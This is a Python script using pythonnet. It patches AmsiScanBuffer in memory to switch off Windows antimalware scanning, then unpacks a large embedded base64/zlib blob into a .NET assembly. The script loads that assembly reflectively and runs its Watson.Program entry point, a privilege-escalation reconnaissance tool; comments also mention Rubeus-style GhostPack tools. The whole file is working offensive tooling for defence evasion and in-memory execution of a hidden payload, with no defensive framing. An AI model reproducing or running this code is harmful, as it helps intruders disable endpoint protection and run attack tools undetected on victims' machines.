import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Watson.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()